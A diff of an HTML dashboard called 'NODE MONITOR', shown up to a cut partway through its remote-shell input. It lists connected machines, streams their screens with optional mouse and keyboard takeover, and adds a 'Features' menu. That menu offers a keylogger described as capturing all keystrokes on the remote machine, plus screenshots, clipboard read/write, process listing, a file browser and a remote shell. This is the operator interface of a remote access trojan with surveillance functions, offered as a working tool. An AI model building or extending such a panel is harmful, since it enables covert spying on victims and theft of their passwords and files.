@@ -1,369 +1,664 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>NODE MONITOR</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --bg:#080c10;--panel:#0d1117;--border:#1a2332;
-    --accent:#00ff88;--accent2:#00b4ff;--warn:#ff6b35;
-    --text:#c9d1d9;--dim:#4a5568;--glow:0 0 20px rgba(0,255,136,0.3);
-  }
-  *{margin:0;padding:0;box-sizing:border-box;}
-  body{background:var(--bg);color:var(--text);font-family:'Share Tech Mono',monospace;min-height:100vh;overflow-x:hidden;}
-  body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,0.015) 2px,rgba(0,255,136,0.015) 4px);pointer-events:none;z-index:0;}
-  .header{padding:20px 40px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:linear-gradient(135deg,rgba(0,255,136,0.05),transparent);position:relative;z-index:1;}
-  .logo{font-family:'Rajdhani',sans-serif;font-weight:700;font-size:26px;letter-spacing:8px;color:var(--accent);text-shadow:var(--glow);}
-  .logo span{color:var(--accent2);}
-  .status-bar{display:flex;align-items:center;gap:20px;font-size:12px;color:var(--dim);}
-  .live-dot{width:8px;height:8px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);animation:pulse 2s infinite;}
-  @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
-  .clock{color:var(--accent2);font-size:13px;}
-  .main{padding:24px 40px;position:relative;z-index:1;}
-  .stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:24px;}
-  .stat-card{background:var(--panel);border:1px solid var(--border);padding:18px;position:relative;overflow:hidden;}
-  .stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--accent);}
-  .stat-card.blue::before{background:var(--accent2);}
-  .stat-card.orange::before{background:var(--warn);}
-  .stat-label{font-size:10px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;margin-bottom:6px;}
-  .stat-value{font-family:'Rajdhani',sans-serif;font-size:40px;font-weight:700;color:var(--accent);line-height:1;}
-  .stat-card.blue .stat-value{color:var(--accent2);}
-  .stat-card.orange .stat-value{color:var(--warn);}
-  .panel{background:var(--panel);border:1px solid var(--border);margin-bottom:20px;}
-  .panel-header{padding:12px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;font-size:11px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;}
-  .panel-header .accent{color:var(--accent);}
-  table{width:100%;border-collapse:collapse;font-size:13px;}
-  th{text-align:left;padding:10px 20px;font-size:10px;letter-spacing:2px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);}
-  td{padding:12px 20px;border-bottom:1px solid rgba(26,35,50,0.5);vertical-align:middle;}
-  tr:last-child td{border-bottom:none;}
-  tr.clickable:hover td{background:rgba(0,255,136,0.05);cursor:pointer;}
-  .status-badge{display:inline-flex;align-items:center;gap:6px;font-size:11px;padding:3px 10px;border-radius:2px;}
-  .status-badge.online{background:rgba(0,255,136,0.1);color:var(--accent);border:1px solid rgba(0,255,136,0.3);}
-  .status-badge.offline{background:rgba(255,107,53,0.1);color:var(--warn);border:1px solid rgba(255,107,53,0.3);}
-  .status-badge::before{content:'';width:5px;height:5px;border-radius:50%;background:currentColor;}
-  .status-badge.online::before{animation:pulse 1.5s infinite;}
-  .hostname{color:var(--accent2);font-weight:bold;}
-  .ip{color:var(--dim);font-size:12px;}
-  .platform{font-size:11px;padding:2px 8px;background:rgba(0,180,255,0.08);border:1px solid rgba(0,180,255,0.2);color:var(--accent2);display:inline-block;}
-  .view-btn{background:rgba(0,255,136,0.1);border:1px solid rgba(0,255,136,0.3);color:var(--accent);padding:4px 14px;font-family:'Share Tech Mono',monospace;font-size:11px;cursor:pointer;letter-spacing:1px;transition:all 0.2s;}
-  .view-btn:hover{background:rgba(0,255,136,0.2);box-shadow:0 0 10px rgba(0,255,136,0.2);}
-  .view-btn:disabled{opacity:0.3;cursor:not-allowed;}
-  .empty-state{padding:50px 20px;text-align:center;color:var(--dim);}
-  .empty-state .icon{font-size:36px;margin-bottom:12px;opacity:0.3;}
-  .empty-state p{font-size:13px;letter-spacing:2px;}
-  .log-area{padding:14px 20px;font-size:12px;max-height:150px;overflow-y:auto;color:var(--dim);line-height:1.8;}
-  .log-area::-webkit-scrollbar{width:4px;}
-  .log-area::-webkit-scrollbar-track{background:var(--bg);}
-  .log-area::-webkit-scrollbar-thumb{background:var(--border);}
-  .log-line{display:flex;gap:12px;}
-  .log-time{color:var(--dim);min-width:85px;}
-  .log-msg.connect{color:var(--accent);}
-  .log-msg.disconnect{color:var(--warn);}
-  .log-msg.info{color:var(--accent2);}
-  .scan-line{position:fixed;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--accent),transparent);opacity:0.15;animation:scan 4s linear infinite;pointer-events:none;z-index:9999;}
-  @keyframes scan{0%{top:-2px}100%{top:100vh}}
+:root{--bg:#060a0e;--panel:#0c1118;--panel2:#101820;--border:#182030;--accent:#00ff88;--accent2:#00b4ff;--warn:#ff6b35;--red:#ff3366;--text:#c9d1d9;--dim:#4a5568;--glow:0 0 20px rgba(0,255,136,0.3);}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:var(--bg);color:var(--text);font-family:'Share Tech Mono',monospace;min-height:100vh;overflow-x:hidden;}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,0.012) 2px,rgba(0,255,136,0.012) 4px);pointer-events:none;z-index:0;}
+.header{padding:18px 36px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;background:linear-gradient(135deg,rgba(0,255,136,0.04),transparent);position:relative;z-index:1;}
+.logo{font-family:'Rajdhani',sans-serif;font-weight:700;font-size:24px;letter-spacing:8px;color:var(--accent);text-shadow:var(--glow);}
+.logo span{color:var(--accent2);}
+.status-bar{display:flex;align-items:center;gap:16px;font-size:12px;color:var(--dim);}
+.live-dot{width:8px;height:8px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);animation:pulse 2s infinite;}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
+.clock{color:var(--accent2);}
+.main{padding:20px 36px;position:relative;z-index:1;}
+.stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:20px;}
+.stat-card{background:var(--panel);border:1px solid var(--border);padding:16px;position:relative;overflow:hidden;}
+.stat-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--accent);}
+.stat-card.b::before{background:var(--accent2);}
+.stat-card.o::before{background:var(--warn);}
+.stat-label{font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;margin-bottom:4px;}
+.stat-value{font-family:'Rajdhani',sans-serif;font-size:38px;font-weight:700;color:var(--accent);line-height:1;}
+.stat-card.b .stat-value{color:var(--accent2);}
+.stat-card.o .stat-value{color:var(--warn);}
+.panel{background:var(--panel);border:1px solid var(--border);margin-bottom:16px;}
+.ph{padding:11px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;font-size:10px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;}
+.ph .ac{color:var(--accent);}
+table{width:100%;border-collapse:collapse;font-size:12px;}
+th{text-align:left;padding:9px 18px;font-size:9px;letter-spacing:2px;color:var(--dim);text-transform:uppercase;border-bottom:1px solid var(--border);}
+td{padding:11px 18px;border-bottom:1px solid rgba(24,32,48,0.6);vertical-align:middle;}
+tr:last-child td{border-bottom:none;}
+tr.cr:hover td{background:rgba(0,255,136,0.04);cursor:pointer;}
+.sb{display:inline-flex;align-items:center;gap:5px;font-size:10px;padding:2px 8px;border-radius:2px;}
+.sb.online{background:rgba(0,255,136,0.08);color:var(--accent);border:1px solid rgba(0,255,136,0.25);}
+.sb.offline{background:rgba(255,107,53,0.08);color:var(--warn);border:1px solid rgba(255,107,53,0.25);}
+.sb::before{content:'';width:4px;height:4px;border-radius:50%;background:currentColor;}
+.sb.online::before{animation:pulse 1.5s infinite;}
+.hn{color:var(--accent2);font-weight:bold;}
+.plat{font-size:10px;padding:1px 7px;background:rgba(0,180,255,0.07);border:1px solid rgba(0,180,255,0.18);color:var(--accent2);display:inline-block;}
+.btn{font-family:'Share Tech Mono',monospace;font-size:10px;padding:4px 12px;cursor:pointer;border-radius:1px;letter-spacing:1px;border:1px solid;transition:all .15s;}
+.btn-green{background:rgba(0,255,136,0.08);border-color:rgba(0,255,136,0.3);color:var(--accent);}
+.btn-green:hover{background:rgba(0,255,136,0.18);}
+.btn-blue{background:rgba(0,180,255,0.08);border-color:rgba(0,180,255,0.3);color:var(--accent2);}
+.btn-blue:hover{background:rgba(0,180,255,0.18);}
+.btn-red{background:rgba(255,51,102,0.08);border-color:rgba(255,51,102,0.3);color:var(--red);}
+.btn-red:hover{background:rgba(255,51,102,0.2);}
+.btn-warn{background:rgba(255,107,53,0.08);border-color:rgba(255,107,53,0.3);color:var(--warn);}
+.btn-warn:hover{background:rgba(255,107,53,0.18);}
+.btn:disabled{opacity:0.25;cursor:not-allowed;}
+.empty-state{padding:44px 20px;text-align:center;color:var(--dim);}
+.empty-state .ic{font-size:32px;opacity:.25;margin-bottom:10px;}
+.log-area{padding:12px 18px;font-size:11px;max-height:130px;overflow-y:auto;color:var(--dim);line-height:1.8;}
+.log-area::-webkit-scrollbar{width:3px;}
+.log-area::-webkit-scrollbar-thumb{background:var(--border);}
+.ll{display:flex;gap:10px;}
+.lt{color:var(--dim);min-width:80px;}
+.lm.connect{color:var(--accent);}
+.lm.disconnect{color:var(--warn);}
+.lm.info{color:var(--accent2);}
+.lm.feature{color:#c084fc;}
+.scan-line{position:fixed;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--accent),transparent);opacity:.12;animation:scan 4s linear infinite;pointer-events:none;z-index:9999;}
+@keyframes scan{0%{top:-2px}100%{top:100vh}}
 
-  /* ── VIEWER MODAL ── */
-  .modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.92);z-index:1000;flex-direction:column;}
-  .modal-overlay.open{display:flex;}
-  .modal-header{display:flex;align-items:center;justify-content:space-between;padding:14px 20px;border-bottom:1px solid var(--border);background:var(--panel);flex-shrink:0;}
-  .modal-title{font-family:'Rajdhani',sans-serif;font-size:18px;font-weight:700;color:var(--accent);letter-spacing:4px;}
-  .modal-controls{display:flex;align-items:center;gap:16px;}
-  .toggle-wrap{display:flex;align-items:center;gap:8px;font-size:12px;color:var(--dim);}
-  .toggle-label{letter-spacing:1px;}
-  .toggle{position:relative;width:44px;height:22px;cursor:pointer;}
-  .toggle input{opacity:0;width:0;height:0;}
-  .toggle-slider{position:absolute;inset:0;background:#1a2332;border:1px solid var(--border);border-radius:2px;transition:0.2s;}
-  .toggle-slider:before{content:'';position:absolute;width:16px;height:16px;left:2px;top:2px;background:var(--dim);transition:0.2s;}
-  input:checked + .toggle-slider{background:rgba(0,255,136,0.15);border-color:var(--accent);}
-  input:checked + .toggle-slider:before{background:var(--accent);transform:translateX(22px);box-shadow:0 0 6px var(--accent);}
-  .close-btn{background:rgba(255,107,53,0.1);border:1px solid rgba(255,107,53,0.3);color:var(--warn);padding:6px 16px;font-family:'Share Tech Mono',monospace;font-size:12px;cursor:pointer;letter-spacing:2px;}
-  .close-btn:hover{background:rgba(255,107,53,0.2);}
-  .modal-body{flex:1;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative;}
-  .screen-container{position:relative;max-width:100%;max-height:100%;}
-  #screen-canvas{display:block;max-width:100%;max-height:calc(100vh - 120px);border:1px solid var(--border);cursor:default;image-rendering:auto;}
-  #screen-canvas.mouse-active{cursor:none;}
-  .no-stream{text-align:center;color:var(--dim);}
-  .no-stream .ns-icon{font-size:48px;opacity:0.2;margin-bottom:16px;}
-  .no-stream p{font-size:13px;letter-spacing:2px;}
-  .cursor-dot{position:absolute;width:12px;height:12px;border:2px solid var(--accent);border-radius:50%;pointer-events:none;transform:translate(-50%,-50%);display:none;box-shadow:0 0 8px var(--accent);z-index:10;}
-  .modal-status{padding:8px 20px;background:var(--panel);border-top:1px solid var(--border);font-size:11px;color:var(--dim);display:flex;gap:20px;flex-shrink:0;}
-  .modal-status span{display:flex;align-items:center;gap:6px;}
-  .kbd-input{position:fixed;opacity:0;pointer-events:none;top:0;left:0;}
+/* ── MODALS ── */
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.94);z-index:500;flex-direction:column;}
+.overlay.open{display:flex;}
+
+/* shared modal header */
+.mh{display:flex;align-items:center;justify-content:space-between;padding:12px 18px;border-bottom:1px solid var(--border);background:var(--panel);flex-shrink:0;gap:16px;}
+.mt{font-family:'Rajdhani',sans-serif;font-size:16px;font-weight:700;color:var(--accent);letter-spacing:4px;white-space:nowrap;}
+.mcontrols{display:flex;align-items:center;gap:12px;flex-wrap:wrap;}
+.tog-wrap{display:flex;align-items:center;gap:7px;font-size:11px;color:var(--dim);}
+.tog{position:relative;width:40px;height:20px;cursor:pointer;}
+.tog input{opacity:0;width:0;height:0;}
+.ts{position:absolute;inset:0;background:#182030;border:1px solid var(--border);border-radius:2px;transition:.2s;}
+.ts:before{content:'';position:absolute;width:14px;height:14px;left:2px;top:2px;background:var(--dim);transition:.2s;}
+input:checked+.ts{background:rgba(0,255,136,0.12);border-color:var(--accent);}
+input:checked+.ts:before{background:var(--accent);transform:translateX(20px);box-shadow:0 0 5px var(--accent);}
+.close-btn{background:rgba(255,51,102,0.1);border:1px solid rgba(255,51,102,0.3);color:var(--red);padding:5px 14px;font-family:'Share Tech Mono',monospace;font-size:11px;cursor:pointer;letter-spacing:2px;}
+.close-btn:hover{background:rgba(255,51,102,0.2);}
+
+/* viewer modal */
+#viewer-modal .mbody{flex:1;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative;}
+.sc-wrap{position:relative;max-width:100%;max-height:100%;}
+#sc{display:block;max-width:100%;max-height:calc(100vh - 110px);border:1px solid var(--border);}
+#sc.ma{cursor:none;}
+.cdot{position:absolute;width:10px;height:10px;border:2px solid var(--accent);border-radius:50%;pointer-events:none;transform:translate(-50%,-50%);display:none;box-shadow:0 0 6px var(--accent);z-index:10;}
+.mfoot{padding:6px 18px;background:var(--panel);border-top:1px solid var(--border);font-size:10px;color:var(--dim);display:flex;gap:18px;flex-shrink:0;}
+.mfoot span{display:flex;align-items:center;gap:5px;}
+.no-stream{text-align:center;color:var(--dim);}
+.no-stream .ni{font-size:44px;opacity:.18;margin-bottom:14px;}
+
+/* features modal */
+#feat-modal{z-index:600;}
+#feat-modal .mbody{flex:1;display:flex;overflow:hidden;}
+.feat-sidebar{width:180px;border-right:1px solid var(--border);background:var(--panel);flex-shrink:0;overflow-y:auto;}
+.feat-sidebar::-webkit-scrollbar{width:3px;}
+.feat-sidebar::-webkit-scrollbar-thumb{background:var(--border);}
+.fsec{padding:8px 0;}
+.fsec-title{padding:6px 14px;font-size:9px;letter-spacing:3px;color:var(--dim);text-transform:uppercase;}
+.fitem{padding:8px 14px;font-size:11px;cursor:pointer;color:var(--dim);display:flex;align-items:center;gap:8px;transition:all .15s;border-left:2px solid transparent;}
+.fitem:hover{color:var(--text);background:rgba(255,255,255,0.03);}
+.fitem.active{color:var(--accent);background:rgba(0,255,136,0.06);border-left-color:var(--accent);}
+.fitem .fi{width:14px;text-align:center;}
+.feat-content{flex:1;display:flex;flex-direction:column;overflow:hidden;background:var(--panel2);}
+.feat-top{padding:12px 18px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;}
+.feat-title{font-family:'Rajdhani',sans-serif;font-size:15px;font-weight:600;color:var(--text);letter-spacing:2px;}
+.feat-actions{display:flex;gap:8px;}
+.feat-body{flex:1;overflow-y:auto;padding:16px 18px;}
+.feat-body::-webkit-scrollbar{width:4px;}
+.feat-body::-webkit-scrollbar-thumb{background:var(--border);}
+.feat-panel{display:none;}
+.feat-panel.active{display:block;}
+
+/* keylog */
+.keylog-box{background:var(--panel);border:1px solid var(--border);padding:14px;font-size:12px;min-height:200px;max-height:400px;overflow-y:auto;line-height:1.9;word-break:break-all;color:var(--text);}
+.keylog-box::-webkit-scrollbar{width:4px;}
+.keylog-box::-webkit-scrollbar-thumb{background:var(--border);}
+.kl-special{color:var(--warn);}
+.kl-enter{color:var(--accent);}
+.kl-ts{color:var(--dim);font-size:10px;}
+
+/* sysinfo */
+.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+.info-card{background:var(--panel);border:1px solid var(--border);padding:12px;}
+.info-card-title{font-size:9px;letter-spacing:2px;color:var(--dim);text-transform:uppercase;margin-bottom:8px;}
+.info-row{display:flex;justify-content:space-between;font-size:11px;padding:3px 0;border-bottom:1px solid rgba(24,32,48,0.5);}
+.info-row:last-child{border-bottom:none;}
+.info-row .k{color:var(--dim);}
+.info-row .v{color:var(--text);}
+.pbar-wrap{margin:4px 0;}
+.pbar-label{display:flex;justify-content:space-between;font-size:10px;color:var(--dim);margin-bottom:3px;}
+.pbar{height:4px;background:var(--border);border-radius:1px;overflow:hidden;}
+.pbar-fill{height:100%;background:var(--accent);transition:width .5s;}
+.pbar-fill.warn{background:var(--warn);}
+.pbar-fill.red{background:var(--red);}
+
+/* processes */
+.proc-table{width:100%;border-collapse:collapse;font-size:11px;}
+.proc-table th{text-align:left;padding:6px 10px;font-size:9px;letter-spacing:2px;color:var(--dim);border-bottom:1px solid var(--border);}
+.proc-table td{padding:5px 10px;border-bottom:1px solid rgba(24,32,48,0.4);}
+.proc-table tr:hover td{background:rgba(255,255,255,0.02);}
+
+/* file browser */
+.path-bar{display:flex;align-items:center;gap:8px;margin-bottom:12px;padding:8px 12px;background:var(--panel);border:1px solid var(--border);}
+.path-input{flex:1;background:transparent;border:none;outline:none;font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--accent2);}
+.file-list{background:var(--panel);border:1px solid var(--border);}
+.file-row{display:flex;align-items:center;gap:10px;padding:8px 12px;border-bottom:1px solid rgba(24,32,48,0.4);cursor:pointer;font-size:11px;transition:background .1s;}
+.file-row:last-child{border-bottom:none;}
+.file-row:hover{background:rgba(0,180,255,0.05);}
+.file-row .fi-ico{width:16px;text-align:center;flex-shrink:0;}
+.file-row .fi-name{flex:1;color:var(--text);}
+.file-row.dir .fi-name{color:var(--accent2);}
+.file-row .fi-size{color:var(--dim);font-size:10px;min-width:70px;text-align:right;}
+.file-row .fi-date{color:var(--dim);font-size:10px;min-width:110px;text-align:right;}
+.file-row .fi-act{display:flex;gap:6px;opacity:0;transition:opacity .1s;}
+.file-row:hover .fi-act{opacity:1;}
+
+/* shell */
+.shell-out{background:var(--panel);border:1px solid var(--border);padding:12px;font-size:12px;min-height:160px;max-height:360px;overflow-y:auto;color:#a3e635;line-height:1.7;white-space:pre-wrap;word-break:break-all;}
+.shell-out::-webkit-scrollbar{width:4px;}
+.shell-out::-webkit-scrollbar-thumb{background:var(--border);}
+.shell-row{display:flex;gap:8px;margin-top:10px;}
+.shell-input{flex:1;background:var(--panel);border:1px solid var(--border);outline:none;font-family:'Share Tech Mono',monospace;font-size:12px;color:var(--text);padding:8px 12px;}
+.shell-input:focus{border-color:rgba(0,255,136,0.3);}
+.shell-err{color:var(--warn);}
+.shell-cmd{color:var(--accent2);}
+
+/* misc */
+.misc-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+.misc-card{background:var(--panel);border:1px solid var(--border);padding:14px;}
+.misc-card-title{font-size:10px;letter-spacing:2px;color:var(--dim);text-transform:uppercase;margin-bottom:10px;}
+.misc-input{width:100%;background:var(--panel2);border:1px solid var(--border);outline:none;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text);padding:7px 10px;margin-bottom:8px;}
+.misc-input:focus{border-color:rgba(0,180,255,0.3);}
+.clip-box{background:var(--panel2);border:1px solid var(--border);padding:10px;font-size:11px;min-height:60px;color:var(--text);word-break:break-all;}
+
+/* toast */
+.toast{position:fixed;bottom:24px;right:24px;background:var(--panel);border:1px solid var(--border);padding:10px 18px;font-size:12px;color:var(--text);z-index:9999;opacity:0;transform:translateY(10px);transition:all .3s;}
+.toast.show{opacity:1;transform:translateY(0);}
+.toast.ok{border-color:rgba(0,255,136,0.4);color:var(--accent);}
+.toast.err{border-color:rgba(255,51,102,0.4);color:var(--red);}
 </style>
 </head>
 <body>
 <div class="scan-line"></div>
-
 <div class="header">
   <div class="logo">NODE<span>MONITOR</span></div>
-  <div class="status-bar">
-    <div class="live-dot"></div><span>LIVE</span>
-    <span style="color:var(--border)">|</span>
-    <span class="clock" id="clock">--:--:--</span>
-  </div>
+  <div class="status-bar"><div class="live-dot"></div><span>LIVE</span><span style="color:var(--border)">|</span><span class="clock" id="clock">--:--:--</span></div>
 </div>
-
 <div class="main">
   <div class="stats-row">
-    <div class="stat-card"><div class="stat-label">Total</div><div class="stat-value" id="stat-total">0</div></div>
-    <div class="stat-card blue"><div class="stat-label">Online</div><div class="stat-value" id="stat-online">0</div></div>
-    <div class="stat-card orange"><div class="stat-label">Offline</div><div class="stat-value" id="stat-offline">0</div></div>
+    <div class="stat-card"><div class="stat-label">Total</div><div class="stat-value" id="st">0</div></div>
+    <div class="stat-card b"><div class="stat-label">Online</div><div class="stat-value" id="so">0</div></div>
+    <div class="stat-card o"><div class="stat-label">Offline</div><div class="stat-value" id="sf">0</div></div>
   </div>
   <div class="panel">
-    <div class="panel-header"><span>CONNECTED <span class="accent">NODES</span></span><span id="last-update">WAITING...</span></div>
-    <div id="table-container">
-      <div class="empty-state"><div class="icon">⬡</div><p>NO NODES CONNECTED</p></div>
-    </div>
+    <div class="ph"><span>CONNECTED <span class="ac">NODES</span></span><span id="lu">WAITING...</span></div>
+    <div id="tc"><div class="empty-state"><div class="ic">⬡</div><p>NO NODES CONNECTED</p></div></div>
   </div>
   <div class="panel">
-    <div class="panel-header"><span>ACTIVITY <span class="accent">LOG</span></span></div>
+    <div class="ph"><span>ACTIVITY <span class="ac">LOG</span></span></div>
     <div class="log-area" id="log"></div>
   </div>
 </div>
 
 <!-- VIEWER MODAL -->
-<div class="modal-overlay" id="viewer-modal">
-  <div class="modal-header">
-    <div class="modal-title" id="modal-title">REMOTE VIEW</div>
-    <div class="modal-controls">
-      <div class="toggle-wrap">
-        <span class="toggle-label" id="mouse-label">Mouse: OFF</span>
-        <label class="toggle">
-          <input type="checkbox" id="toggle-mouse" onchange="toggleMouse(this)">
-          <span class="toggle-slider"></span>
-        </label>
+<div class="overlay" id="viewer-modal">
+  <div class="mh">
+    <div class="mt" id="vmt">REMOTE VIEW</div>
+    <div class="mcontrols">
+      <div class="tog-wrap">
+        <span id="mlbl" style="color:var(--dim)">Mouse: OFF</span>
+        <label class="tog"><input type="checkbox" id="tm" onchange="toggleMouse(this)"><span class="ts"></span></label>
       </div>
-      <div class="toggle-wrap">
-        <span class="toggle-label" id="kbd-label">Keyboard: OFF</span>
-        <label class="toggle">
-          <input type="checkbox" id="toggle-kbd" onchange="toggleKbd(this)">
-          <span class="toggle-slider"></span>
-        </label>
+      <div class="tog-wrap">
+        <span id="klbl" style="color:var(--dim)">Keyboard: OFF</span>
+        <label class="tog"><input type="checkbox" id="tk" onchange="toggleKbd(this)"><span class="ts"></span></label>
       </div>
+      <button class="btn btn-blue" onclick="openFeatures()" style="margin-left:8px">⚙ FEATURES</button>
       <button class="close-btn" onclick="closeViewer()">✕ CLOSE</button>
     </div>
   </div>
-  <div class="modal-body">
-    <div id="no-stream" class="no-stream">
-      <div class="ns-icon">📡</div>
-      <p>WAITING FOR SCREEN STREAM...</p>
-    </div>
-    <div class="screen-container" id="screen-container" style="display:none">
-      <canvas id="screen-canvas"></canvas>
-      <div class="cursor-dot" id="cursor-dot"></div>
+  <div class="mbody">
+    <div id="ns" class="no-stream"><div class="ni">📡</div><p style="font-size:12px;letter-spacing:2px">WAITING FOR STREAM...</p></div>
+    <div class="sc-wrap" id="scw" style="display:none">
+      <canvas id="sc"></canvas>
+      <div class="cdot" id="cdot"></div>
     </div>
   </div>
-  <div class="modal-status">
-    <span>FPS: <span id="fps-counter">0</span></span>
-    <span>Resolution: <span id="res-info">--</span></span>
-    <span>Target: <span id="target-info" style="color:var(--accent2)">--</span></span>
+  <div class="mfoot">
+    <span>FPS: <span id="fps">0</span></span>
+    <span>Res: <span id="res">--</span></span>
+    <span>Node: <span id="tgt" style="color:var(--accent2)">--</span></span>
   </div>
 </div>
 
-<input type="text" class="kbd-input" id="kbd-input" autocomplete="off">
+<!-- FEATURES MODAL -->
+<div class="overlay" id="feat-modal">
+  <div class="mh">
+    <div class="mt" id="fmt">FEATURES</div>
+    <div class="mcontrols">
+      <button class="close-btn" onclick="closeFeatures()">✕ CLOSE</button>
+    </div>
+  </div>
+  <div class="mbody">
+    <div class="feat-sidebar">
+      <div class="fsec">
+        <div class="fsec-title">Surveillance</div>
+        <div class="fitem active" onclick="showFeat('keylog')" id="fi-keylog"><span class="fi">⌨</span>Keylogger</div>
+        <div class="fitem" onclick="showFeat('screenshot')" id="fi-screenshot"><span class="fi">📷</span>Screenshot</div>
+        <div class="fitem" onclick="showFeat('clipboard')" id="fi-clipboard"><span class="fi">📋</span>Clipboard</div>
+      </div>
+      <div class="fsec">
+        <div class="fsec-title">System</div>
+        <div class="fitem" onclick="showFeat('sysinfo')" id="fi-sysinfo"><span class="fi">💻</span>System Info</div>
+        <div class="fitem" onclick="showFeat('processes')" id="fi-processes"><span class="fi">⚙</span>Processes</div>
+        <div class="fitem" onclick="showFeat('shell')" id="fi-shell"><span class="fi">$</span>Shell</div>
+      </div>
+      <div class="fsec">
+        <div class="fsec-title">Files</div>
+        <div class="fitem" onclick="showFeat('files')" id="fi-files"><span class="fi">📁</span>File Browser</div>
+      </div>
+      <div class="fsec">
+        <div class="fsec-title">Control</div>
+        <div class="fitem" onclick="showFeat('misc')" id="fi-misc"><span class="fi">🎮</span>Misc Controls</div>
+      </div>
+    </div>
+    <div class="feat-content">
+      <!-- KEYLOGGER -->
+      <div class="feat-panel active" id="fp-keylog">
+        <div class="feat-top">
+          <div class="feat-title">KEYLOGGER</div>
+          <div class="feat-actions">
+            <button class="btn btn-green" id="kl-start-btn" onclick="klStart()">▶ START</button>
+            <button class="btn btn-warn" id="kl-stop-btn" onclick="klStop()" style="display:none">■ STOP</button>
+            <button class="btn btn-blue" onclick="klClear()">CLEAR</button>
+          </div>
+        </div>
+        <div class="feat-body">
+          <div style="font-size:10px;color:var(--dim);margin-bottom:10px;letter-spacing:1px">Captures all keystrokes on the remote machine. Toggle to start/stop.</div>
+          <div class="keylog-box" id="kl-box">Keylog output will appear here...</div>
+        </div>
+      </div>
+      <!-- SCREENSHOT -->
+      <div class="feat-panel" id="fp-screenshot">
+        <div class="feat-top"><div class="feat-title">SCREENSHOT</div><div class="feat-actions"><button class="btn btn-green" onclick="takeScreenshot()">📷 CAPTURE</button></div></div>
+        <div class="feat-body">
+          <div style="font-size:10px;color:var(--dim);margin-bottom:12px;letter-spacing:1px">Takes a full-resolution screenshot of the remote screen.</div>
+          <div id="ss-container" style="text-align:center;color:var(--dim);font-size:12px">Click CAPTURE to take a screenshot</div>
+        </div>
+      </div>
+      <!-- CLIPBOARD -->
+      <div class="feat-panel" id="fp-clipboard">
+        <div class="feat-top"><div class="feat-title">CLIPBOARD</div><div class="feat-actions"><button class="btn btn-green" onclick="clipGet()">GET</button></div></div>
+        <div class="feat-body">
+          <div style="font-size:10px;color:var(--dim);margin-bottom:10px">Read or write the remote clipboard.</div>
+          <div style="font-size:10px;color:var(--dim);margin-bottom:6px;letter-spacing:1px">CURRENT CLIPBOARD:</div>
+          <div class="clip-box" id="clip-box">Click GET to read clipboard</div>
+          <div style="font-size:10px;color:var(--dim);margin:12px 0 6px;letter-spacing:1px">SET CLIPBOARD:</div>
+          <textarea class="misc-input" id="clip-set-val" rows="3" placeholder="Enter text to set on remote clipboard..."></textarea>
+          <button class="btn btn-blue" onclick="clipSet()">SET CLIPBOARD</button>
+        </div>
+      </div>
+      <!-- SYSINFO -->
+      <div class="feat-panel" id="fp-sysinfo">
+        <div class="feat-top"><div class="feat-title">SYSTEM INFO</div><div class="feat-actions"><button class="btn btn-green" onclick="loadSysinfo()">↻ REFRESH</button></div></div>
+        <div class="feat-body"><div id="sysinfo-content" style="color:var(--dim);font-size:12px">Click refresh to load system info...</div></div>
+      </div>
+      <!-- PROCESSES -->
+      <div class="feat-panel" id="fp-processes">
+        <div class="feat-top"><div class="feat-title">PROCESSES</div><div class="feat-actions"><button class="btn btn-green" onclick="loadProcesses()">↻ REFRESH</button></div></div>
+        <div class="feat-body"><div id="proc-content" style="color:var(--dim);font-size:12px">Click refresh to load process list...</div></div>
+      </div>
+      <!-- SHELL -->
+      <div class="feat-panel" id="fp-shell">
+        <div class="feat-top"><div class="feat-title">REMOTE SHELL</div><div class="feat-actions"><button class="btn btn-warn" onclick="shellClear()">CLEAR</button></div></div>
+        <div class="feat-body">
+          <div style="font-size:10px;color:var(--dim);margin-bottom:8px">Execute shell commands on the remote machine.</div>
+          <div class="shell-out" id="shell-out">Remote shell ready. Enter a command below.</div>
+          <div class="shell-row">
+            <input class="shell-input" id="shell-input" placeholder="Enter command..." onkeydown="shellKey(event)">
